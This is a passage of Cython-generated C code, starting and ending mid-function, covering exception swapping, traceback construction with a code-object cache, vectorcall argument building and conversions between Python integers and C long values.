__Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n  #if CYTHON_USE_EXC_INFO_STACK && PY_VERSION_HEX >= 0x030B00a4\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    tmp_value = exc_info->exc_value;\n    exc_info->exc_value = *value;\n    if (tmp_value == NULL || tmp_value == Py_None) {\n        Py_XDECREF(tmp_value);\n        tmp_value = NULL;\n        tmp_type = NULL;\n        tmp_tb = NULL;\n    } else {\n        tmp_type = (PyObject*) Py_TYPE(tmp_value);\n        Py_INCREF(tmp_type);\n        #if CYTHON_COMPILING_IN_CPYTHON\n        tmp_tb = ((PyBaseExceptionObject*) tmp_value)->traceback;\n        Py_XINCREF(tmp_tb);\n        #else\n        tmp_tb = PyException_GetTraceback(tmp_value);\n        #endif\n    }\n  #elif CYTHON_USE_EXC_INFO_STACK\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    tmp_type = exc_info->exc_type;\n    tmp_value = exc_info->exc_value;\n    tmp_tb = exc_info->exc_traceback;\n    exc_info->exc_type = *type;\n    exc_info->exc_value = *value;\n    exc_info->exc_traceback = *tb;\n  #else\n    tmp_type = tstate->exc_type;\n    tmp_value = tstate->exc_value;\n    tmp_tb = tstate->exc_traceback;\n    tstate->exc_type = *type;\n    tstate->exc_value = *value;\n    tstate->exc_traceback = *tb;\n  #endif\n    *type = tmp_type;\n    *value = tmp_value;\n    *tb = tmp_tb;\n}\n#else\nstatic CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);\n    PyErr_SetExcInfo(*type, *value, *tb);\n    *type = tmp_type;\n    *value = tmp_value;\n    *tb = tmp_tb;\n}\n#endif\n\n\n#if !CYTHON_VECTORCALL || PY_VERSION_HEX < 0x03090000\nstatic PyObject *__Pyx_PyObject_FastCallMethod(PyObject *name, PyObject *const *args, size_t nargsf) {\n    PyObject *result;\n    PyObject *attr = PyObject_GetAttr(args[0], name);\n    if (unlikely(!attr))\n        return NULL;\n    result = __Pyx_PyObject_FastCall(attr, args+1, nargsf - 1);\n    Py_DECREF(attr);\n    return result;\n}\n#endif\n\n\n#if CYTHON_CLINE_IN_TRACEBACK && CYTHON_CLINE_IN_TRACEBACK_RUNTIME\nstatic int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line) {\n    PyObject *use_cline;\n    PyObject *ptype, *pvalue, *ptraceback;\n#if CYTHON_COMPILING_IN_CPYTHON\n    PyObject **cython_runtime_dict;\n#endif\n    CYTHON_MAYBE_UNUSED_VAR(tstate);\n    if (unlikely(!__pyx_mstate_global->__pyx_cython_runtime)) {\n        return c_line;\n    }\n    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\n#if CYTHON_COMPILING_IN_CPYTHON\n    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_mstate_global->__pyx_cython_runtime);\n    if (likely(cython_runtime_dict)) {\n        __Pyx_BEGIN_CRITICAL_SECTION(*cython_runtime_dict);\n        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(\n            use_cline, *cython_runtime_dict,\n            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_mstate_global->__pyx_n_u_cline_in_traceback))\n        Py_XINCREF(use_cline);\n        __Pyx_END_CRITICAL_SECTION();\n    } else\n#endif\n    {\n      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStrNoError(__pyx_mstate_global->__pyx_cython_runtime, __pyx_mstate_global->__pyx_n_u_cline_in_traceback);\n      if (use_cline_obj) {\n        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;\n        Py_INCREF(use_cline);\n        Py_DECREF(use_cline_obj);\n      } else {\n        PyErr_Clear();\n        use_cline = NULL;\n      }\n    }\n    if (!use_cline) {\n        c_line = 0;\n        (void) PyObject_SetAttr(__pyx_mstate_global->__pyx_cython_runtime, __pyx_mstate_global->__pyx_n_u_cline_in_traceback, Py_False);\n    }\n    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {\n        c_line = 0;\n    }\n    Py_XDECREF(use_cline);\n    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\n    return c_line;\n}\n#endif\n\n\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {\n    int start = 0, mid = 0, end = count - 1;\n    if (end >= 0 && code_line > entries[end].code_line) {\n        return count;\n    }\n    while (start < end) {\n        mid = start + (end - start) / 2;\n        if (code_line < entries[mid].code_line) {\n            end = mid;\n        } else if (code_line > entries[mid].code_line) {\n             start = mid + 1;\n        } else {\n            return mid;\n        }\n    }\n    if (code_line <= entries[mid].code_line) {\n        return mid;\n    } else {\n        return mid + 1;\n    }\n}\nstatic __Pyx_CachedCodeObjectType *__pyx__find_code_object(struct __Pyx_CodeObjectCache *code_cache, int code_line) {\n    __Pyx_CachedCodeObjectType* code_object;\n    int pos;\n    if (unlikely(!code_line) || unlikely(!code_cache->entries)) {\n        return NULL;\n    }\n    pos = __pyx_bisect_code_objects(code_cache->entries, code_cache->count, code_line);\n    if (unlikely(pos >= code_cache->count) || unlikely(code_cache->entries[pos].code_line != code_line)) {\n        return NULL;\n    }\n    code_object = code_cache->entries[pos].code_object;\n    Py_INCREF(code_object);\n    return code_object;\n}\nstatic __Pyx_CachedCodeObjectType *__pyx_find_code_object(int code_line) {\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING && !CYTHON_ATOMICS\n    (void)__pyx__find_code_object;\n    return NULL; // Most implementation should have atomics. But otherwise, don\'t make it thread-safe, just miss.\n#else\n    struct __Pyx_CodeObjectCache *code_cache = &__pyx_mstate_global->__pyx_code_cache;\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    __pyx_nonatomic_int_type old_count = __pyx_atomic_incr_acq_rel(&code_cache->accessor_count);\n    if (old_count < 0) {\n        __pyx_atomic_decr_acq_rel(&code_cache->accessor_count);\n        return NULL;\n    }\n#endif\n    __Pyx_CachedCodeObjectType *result = __pyx__find_code_object(code_cache, code_line);\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    __pyx_atomic_decr_acq_rel(&code_cache->accessor_count);\n#endif\n    return result;\n#endif\n}\nstatic void __pyx__insert_code_object(struct __Pyx_CodeObjectCache *code_cache, int code_line, __Pyx_CachedCodeObjectType* code_object)\n{\n    int pos, i;\n    __Pyx_CodeObjectCacheEntry* entries = code_cache->entries;\n    if (unlikely(!code_line)) {\n        return;\n    }\n    if (unlikely(!entries)) {\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));\n        if (likely(entries)) {\n            code_cache->entries = entries;\n            code_cache->max_count = 64;\n            code_cache->count = 1;\n            entries[0].code_line = code_line;\n            entries[0].code_object = code_object;\n            Py_INCREF(code_object);\n        }\n        return;\n    }\n    pos = __pyx_bisect_code_objects(code_cache->entries, code_cache->count, code_line);\n    if ((pos < code_cache->count) && unlikely(code_cache->entries[pos].code_line == code_line)) {\n        __Pyx_CachedCodeObjectType* tmp = entries[pos].code_object;\n        entries[pos].code_object = code_object;\n        Py_INCREF(code_object);\n        Py_DECREF(tmp);\n        return;\n    }\n    if (code_cache->count == code_cache->max_count) {\n        int new_max = code_cache->max_count + 64;\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(\n            code_cache->entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));\n        if (unlikely(!entries)) {\n            return;\n        }\n        code_cache->entries = entries;\n        code_cache->max_count = new_max;\n    }\n    for (i=code_cache->count; i>pos; i--) {\n        entries[i] = entries[i-1];\n    }\n    entries[pos].code_line = code_line;\n    entries[pos].code_object = code_object;\n    code_cache->count++;\n    Py_INCREF(code_object);\n}\nstatic void __pyx_insert_code_object(int code_line, __Pyx_CachedCodeObjectType* code_object) {\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING && !CYTHON_ATOMICS\n    (void)__pyx__insert_code_object;\n    return; // Most implementation should have atomics. But otherwise, don\'t make it thread-safe, just fail.\n#else\n    struct __Pyx_CodeObjectCache *code_cache = &__pyx_mstate_global->__pyx_code_cache;\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    __pyx_nonatomic_int_type expected = 0;\n    if (!__pyx_atomic_int_cmp_exchange(&code_cache->accessor_count, &expected, INT_MIN)) {\n        return;\n    }\n#endif\n    __pyx__insert_code_object(code_cache, code_line, code_object);\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    __pyx_atomic_sub(&code_cache->accessor_count, INT_MIN);\n#endif\n#endif\n}\n\n\n#include "compile.h"\n#include "frameobject.h"\n#include "traceback.h"\n#if PY_VERSION_HEX >= 0x030b00a6 && !CYTHON_COMPILING_IN_LIMITED_API && !defined(PYPY_VERSION)\n  #ifndef Py_BUILD_CORE\n    #define Py_BUILD_CORE 1\n  #endif\n  #include "internal/pycore_frame.h"\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic PyObject *__Pyx_PyCode_Replace_For_AddTraceback(PyObject *code, PyObject *scratch_dict,\n                                                       PyObject *firstlineno, PyObject *name) {\n    PyObject *replace = NULL;\n    if (unlikely(PyDict_SetItemString(scratch_dict, "co_firstlineno", firstlineno))) return NULL;\n    if (unlikely(PyDict_SetItemString(scratch_dict, "co_name", name))) return NULL;\n    replace = PyObject_GetAttrString(code, "replace");\n    if (likely(replace)) {\n        PyObject *result = PyObject_Call(replace, __pyx_mstate_global->__pyx_empty_tuple, scratch_dict);\n        Py_DECREF(replace);\n        return result;\n    }\n    PyErr_Clear();\n    return NULL;\n}\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename) {\n    PyObject *code_object = NULL, *py_py_line = NULL, *py_funcname = NULL, *dict = NULL;\n    PyObject *replace = NULL, *getframe = NULL, *frame = NULL;\n    PyObject *exc_type, *exc_value, *exc_traceback;\n    int success = 0;\n    if (c_line) {\n        (void) __pyx_cfilenm;\n        (void) __Pyx_CLineForTraceback(__Pyx_PyThreadState_Current, c_line);\n    }\n    PyErr_Fetch(&exc_type, &exc_value, &exc_traceback);\n    code_object = __pyx_find_code_object(c_line ? -c_line : py_line);\n    if (!code_object) {\n        code_object = Py_CompileString("_getframe()", filename, Py_eval_input);\n        if (unlikely(!code_object)) goto bad;\n        py_py_line = PyLong_FromLong(py_line);\n        if (unlikely(!py_py_line)) goto bad;\n        py_funcname = PyUnicode_FromString(funcname);\n        if (unlikely(!py_funcname)) goto bad;\n        dict = PyDict_New();\n        if (unlikely(!dict)) goto bad;\n        {\n            PyObject *old_code_object = code_object;\n            code_object = __Pyx_PyCode_Replace_For_AddTraceback(code_object, dict, py_py_line, py_funcname);\n            Py_DECREF(old_code_object);\n        }\n        if (unlikely(!code_object)) goto bad;\n        __pyx_insert_code_object(c_line ? -c_line : py_line, code_object);\n    } else {\n        dict = PyDict_New();\n    }\n    getframe = PySys_GetObject("_getframe");\n    if (unlikely(!getframe)) goto bad;\n    if (unlikely(PyDict_SetItemString(dict, "_getframe", getframe))) goto bad;\n    frame = PyEval_EvalCode(code_object, dict, dict);\n    if (unlikely(!frame) || frame == Py_None) goto bad;\n    success = 1;\n  bad:\n    PyErr_Restore(exc_type, exc_value, exc_traceback);\n    Py_XDECREF(code_object);\n    Py_XDECREF(py_py_line);\n    Py_XDECREF(py_funcname);\n    Py_XDECREF(dict);\n    Py_XDECREF(replace);\n    if (success) {\n        PyTraceBack_Here(\n            (struct _frame*)frame);\n    }\n    Py_XDECREF(frame);\n}\n#else\nstatic PyCodeObject* __Pyx_CreateCodeObjectForTraceback(\n            const char *funcname, int c_line,\n            int py_line, const char *filename) {\n    PyCodeObject *py_code = NULL;\n    PyObject *py_funcname = NULL;\n    if (c_line) {\n        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);\n        if (!py_funcname) goto bad;\n        funcname = PyUnicode_AsUTF8(py_funcname);\n        if (!funcname) goto bad;\n    }\n    py_code = PyCode_NewEmpty(filename, funcname, py_line);\n    Py_XDECREF(py_funcname);\n    return py_code;\nbad:\n    Py_XDECREF(py_funcname);\n    return NULL;\n}\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename) {\n    PyCodeObject *py_code = 0;\n    PyFrameObject *py_frame = 0;\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\n    PyObject *ptype, *pvalue, *ptraceback;\n    if (c_line) {\n        c_line = __Pyx_CLineForTraceback(tstate, c_line);\n    }\n    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);\n    if (!py_code) {\n        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\n        py_code = __Pyx_CreateCodeObjectForTraceback(\n            funcname, c_line, py_line, filename);\n        if (!py_code) {\n            \n            Py_XDECREF(ptype);\n            Py_XDECREF(pvalue);\n            Py_XDECREF(ptraceback);\n            goto bad;\n        }\n        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\n        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);\n    }\n    py_frame = PyFrame_New(\n        tstate,            \n        py_code,           \n        __pyx_mstate_global->__pyx_d,    \n        0                  \n    );\n    if (!py_frame) goto bad;\n    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);\n    PyTraceBack_Here(py_frame);\nbad:\n    Py_XDECREF(py_code);\n    Py_XDECREF(py_frame);\n}\n#endif\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX < 0x030d0000\nstatic __Pyx_TypeName\n__Pyx_PyType_GetFullyQualifiedName(PyTypeObject* tp)\n{\n    PyObject *module = NULL, *name = NULL, *result = NULL;\n    #if __PYX_LIMITED_VERSION_HEX < 0x030b0000\n    name = __Pyx_PyObject_GetAttrStr((PyObject *)tp,\n                                               __pyx_mstate_global->__pyx_n_u_qualname);\n    #else\n    name = PyType_GetQualName(tp);\n    #endif\n    if (unlikely(name == NULL) || unlikely(!PyUnicode_Check(name))) goto bad;\n    module = __Pyx_PyObject_GetAttrStr((PyObject *)tp,\n                                               __pyx_mstate_global->__pyx_n_u_module);\n    if (unlikely(module == NULL) || unlikely(!PyUnicode_Check(module))) goto bad;\n    if (PyUnicode_CompareWithASCIIString(module, "builtins") == 0) {\n        result = name;\n        name = NULL;\n        goto done;\n    }\n    result = PyUnicode_FromFormat("%U.%U", module, name);\n    if (unlikely(result == NULL)) goto bad;\n  done:\n    Py_XDECREF(name);\n    Py_XDECREF(module);\n    return result;\n  bad:\n    PyErr_Clear();\n    if (name) {\n        result = name;\n        name = NULL;\n    } else {\n        result = __Pyx_NewRef(__pyx_mstate_global->__pyx_kp_u_);\n    }\n    goto done;\n}\n#endif\n\n\n#if CYTHON_VECTORCALL\nstatic int __Pyx_VectorcallBuilder_AddArg(PyObject *key, PyObject *value, PyObject *builder, PyObject **args, int n) {\n    (void)__Pyx_PyObject_FastCallDict;\n    if (__Pyx_PyTuple_SET_ITEM(builder, n, key) != (0)) return -1;\n    Py_INCREF(key);\n    args[n] = value;\n    return 0;\n}\nCYTHON_UNUSED static int __Pyx_VectorcallBuilder_AddArg_Check(PyObject *key, PyObject *value, PyObject *builder, PyObject **args, int n) {\n    (void)__Pyx_VectorcallBuilder_AddArgStr;\n    if (unlikely(!PyUnicode_Check(key))) {\n        PyErr_SetString(PyExc_TypeError, "keywords must be strings");\n        return -1;\n    }\n    return __Pyx_VectorcallBuilder_AddArg(key, value, builder, args, n);\n}\nstatic int __Pyx_VectorcallBuilder_AddArgStr(const char *key, PyObject *value, PyObject *builder, PyObject **args, int n) {\n    PyObject *pyKey = PyUnicode_FromString(key);\n    if (!pyKey) return -1;\n    return __Pyx_VectorcallBuilder_AddArg(pyKey, value, builder, args, n);\n}\n#else // CYTHON_VECTORCALL\nCYTHON_UNUSED static int __Pyx_VectorcallBuilder_AddArg_Check(PyObject *key, PyObject *value, PyObject *builder, CYTHON_UNUSED PyObject **args, CYTHON_UNUSED int n) {\n    if (unlikely(!PyUnicode_Check(key))) {\n        PyErr_SetString(PyExc_TypeError, "keywords must be strings");\n        return -1;\n    }\n    return PyDict_SetItem(builder, key, value);\n}\n#endif\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyLong_From_long(long value) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored "-Wconversion"\n#endif\n    const long neg_one = (long) -1, const_zero = (long) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n    if (is_unsigned) {\n        if (sizeof(long) < sizeof(long)) {\n            return PyLong_FromLong((long) value);\n        } else if (sizeof(long) <= sizeof(unsigned long)) {\n            return PyLong_FromUnsignedLong((unsigned long) value);\n#if defined(HAVE_LONG_LONG) && !CYTHON_COMPILING_IN_PYPY\n        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\n            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);\n#endif\n        }\n    } else {\n        if (sizeof(long) <= sizeof(long)) {\n            return PyLong_FromLong((long) value);\n#ifdef HAVE_LONG_LONG\n        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\n            return PyLong_FromLongLong((PY_LONG_LONG) value);\n#endif\n        }\n    }\n    {\n        unsigned char *bytes = (unsigned char *)&value;\n#if !CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX >= 0x030d00A4\n        if (is_unsigned) {\n            return PyLong_FromUnsignedNativeBytes(bytes, sizeof(value), -1);\n        } else {\n            return PyLong_FromNativeBytes(bytes, sizeof(value), -1);\n        }\n#elif !CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030d0000\n        int one = 1; int little = (int)*(unsigned char *)&one;\n        return _PyLong_FromByteArray(bytes, sizeof(long),\n                                     little, !is_unsigned);\n#else\n        int one = 1; int little = (int)*(unsigned char *)&one;\n        PyObject *from_bytes, *result = NULL, *kwds = NULL;\n        PyObject *py_bytes = NULL, *order_str = NULL;\n        from_bytes = PyObject_GetAttrString((PyObject*)&PyLong_Type, "from_bytes");\n        if (!from_bytes) return NULL;\n        py_bytes = PyBytes_FromStringAndSize((char*)bytes, sizeof(long));\n        if (!py_bytes) goto limited_bad;\n        order_str = PyUnicode_FromString(little ? "little" : "big");\n        if (!order_str) goto limited_bad;\n        {\n            PyObject *args[3+(CYTHON_VECTORCALL ? 1 : 0)] = { NULL, py_bytes, order_str };\n            if (!is_unsigned) {\n                kwds = __Pyx_MakeVectorcallBuilderKwds(1);\n                if (!kwds) goto limited_bad;\n                if (__Pyx_VectorcallBuilder_AddArgStr("signed", __Pyx_NewRef(Py_True), kwds, args+3, 0) < 0) goto limited_bad;\n            }\n            result = __Pyx_Object_Vectorcall_CallFromBuilder(from_bytes, args+1, 2 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET, kwds);\n        }\n        limited_bad:\n        Py_XDECREF(kwds);\n        Py_XDECREF(order_str);\n        Py_XDECREF(py_bytes);\n        Py_XDECREF(from_bytes);\n        return result;\n#endif\n    }\n}\n\n\n#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)\n#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)\n#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\\\n    {\\\n        func_type value = func_value;\\\n        if (sizeof(target_type) < sizeof(func_type)) {\\\n            if (unlikely(value != (func_type) (target_type) value)) {\\\n                func_type zero = 0;\\\n                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\\\n                    return (target_type) -1;\\\n                if (is_unsigned && unlikely(value < zero))\\\n                    goto raise_neg_overflow;\\\n                else\\\n                    goto raise_overflow;\\\n            }\\\n        }\\\n        return (target_type) value;\\\n    }\n\n\nstatic CYTHON_INLINE long __Pyx_PyLong_As_long(PyObject *x) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored "-Wconversion"\n#endif\n    const long neg_one = (long) -1, const_zero = (long) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n    if (unlikely(!PyLong_Check(x))) {\n        long val;\n        PyObject *tmp = __Pyx_PyNumber_Long(x);\n        if (!tmp) return (long) -1;\n        val = __Pyx_PyLong_As_long(tmp);\n        Py_DECREF(tmp);\n        return val;\n    }\n    if (is_unsigned) {\n#if CYTHON_USE_PYLONG_INTERNALS\n        if (unlikely(__Pyx_PyLong_IsNeg(x))) {\n            goto raise_neg_overflow;\n        } else if (__Pyx_PyLong_IsCompact(x)) {\n            __PYX_VERIFY_RETURN_INT(long, __Pyx_compact_upylong, __Pyx_PyLong_CompactValueUnsigned(x))\n        } else {\n            const digit* digits = __Pyx_PyLong_Digits(x);\n            assert(__Pyx_PyLong_DigitCount(x) > 1);\n            switch (__Pyx_PyLong_DigitCount(x)) {\n                case 2:\n                    if ((8 * sizeof(long) > 1 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) >= 2 * PyLong_SHIFT)) {\n                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n                case 3:\n                    if ((8 * sizeof(long) > 2 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) >= 3 * PyLong_SHIFT)) {\n                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n                case 4:\n                    if ((8 * sizeof(long) > 3 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) >= 4 * PyLong_SHIFT)) {\n                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n            }\n        }\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A7\n        if (unlikely(Py_SIZE(x) < 0)) {\n            goto raise_neg_overflow;\n        }\n#else\n        {\n            int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n            if (unlikely(result < 0))\n                return (long) -1;\n            if (unlikely(result == 1))\n                goto raise_neg_overflow;\n        }\n#endif\n        if ((sizeof(long) <= sizeof(unsigned long))) {\n            __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))\n#ifdef HAVE_LONG_LONG\n        } else if ((sizeof(long) <= sizeof(unsigned PY_LONG_LONG))) {\n            __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\n#endif\n        }\n    } else {\n#if CYTHON_USE_PYLONG_INTERNALS\n        if (__Pyx_PyLong_IsCompact(x)) {\n            __PYX_VERIFY_RETURN_INT(long, __Pyx_compact_pylong, __Pyx_PyLong_CompactValue(x))\n        } else {\n            const digit* digits = __Pyx_PyLong_Digits(x);\n            assert(__Pyx_PyLong_DigitCount(x) > 1);\n            switch (__Pyx_PyLong_SignedDigitCount(x)) {\n                case -2:\n                    if ((8 * sizeof(long) - 1 > 1 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {\n                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 2:\n                    if ((8 * sizeof(long) > 1 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {\n                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case -3:\n                    if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {\n                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 3:\n                    if ((8 * sizeof(long) > 2 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {\n                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case -4:\n                    if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) - 1 > 4 * PyLong_SHIFT)) {\n                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 4:\n                    if ((8 * sizeof(long) > 3 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) - 1 > 4 * PyLong_SHIFT)) {\n                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n            }\n        }\n#endif\n        if ((sizeof(long) <= sizeof(long))) {\n            __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))\n#ifdef HAVE_LONG_LONG\n        } else if ((sizeof(long) <= sizeof(PY_LONG_LONG))) {\n            __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))\n#endif\n        }\n    }\n    {\n        long val;\n        int ret = -1;\n#if PY_VERSION_HEX >= 0x030d00A6 && !CYTHON_COMPILING_IN_LIMITED_API\n        Py_ssize_t bytes_copied = PyLong_AsNativeBytes(\n            x, &val, sizeof(val), Py_ASNATIVEBYTES_NATIVE_ENDIAN | (is_unsigned ? Py_ASNATIVEBYTES_UNSIGNED_BUFFER | Py_ASNATIVEBYTES_REJECT_NEGATIVE : 0));\n        if (unlikely(bytes_copied == -1)) {\n        } else if (unlikely(bytes_copied > (Py_ssize_t) sizeof(val))) {\n            goto raise_overflow;\n        } else {\n            ret = 0;\n        }\n#elif PY_VERSION_HEX < 0x030d0000 && !(CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API) || defined(_PyLong_AsByteArray)\n        int one = 1; int is_little = (int)*(unsigned char *)&one;\n        unsigned char *bytes = (unsigned char *)&val;\n        ret = _PyLong_AsByteArray((PyLongObject *)x,\n                                    bytes, sizeof(val),\n                                    is_little, !is_unsigned);\n#else\n        PyObject *v;\n        PyObject *stepval = NULL, *mask = NULL, *shift = NULL;\n        int bits, remaining_bits, is_negative 